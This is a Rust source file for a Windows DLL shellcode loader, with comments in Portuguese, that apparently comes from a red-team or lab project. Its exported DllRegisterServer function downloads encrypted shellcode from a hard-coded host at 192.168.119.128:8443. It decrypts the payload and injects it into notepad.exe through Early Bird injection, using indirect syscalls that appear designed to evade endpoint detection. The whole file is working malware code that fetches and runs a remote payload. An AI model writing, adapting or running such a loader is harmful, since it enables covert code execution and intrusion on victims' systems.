use std::time::Duration;

mod direct_syscalls;
mod crypt;
mod download;
mod sleep;
mod utils;
mod indirect_loader;
mod indirect_syscalls;
pub mod bird;

#[no_mangle]
pub extern "stdcall" fn DllRegisterServer(
    _hwnd: winapi::shared::windef::HWND,
    _hinst: winapi::shared::minwindef::HINSTANCE,
    _lpszCmdLine: winapi::shared::ntdef::LPSTR,
    _nCmdShow: i32,
) -> i32 {
    std::thread::spawn(|| {
        let encrypted_shellcode = match download::get_contents("http://192.168.119.128:8443/content.b64") {
            Ok(data) => data,
            Err(_) => return,
        };

        let shellcode = match crypt::decrypt_shellcode(&encrypted_shellcode) {
            Ok(s) => s,
            Err(_) => return,
        };

        let target_process = "C:\\Windows\\System32\\notepad.exe";

        // Inicia o resolver antes de fly()
        unsafe { crate::indirect_syscalls::resolver::init_indirect_syscalls(); }

        if !bird::fly(&shellcode, target_process) {
            #[cfg(debug_assertions)]
            eprintln!("[-] Early Bird injection falhou na DLL.");
        }
    });
    std::thread::sleep(Duration::from_millis(500));
    0 // Retorna rápido!
}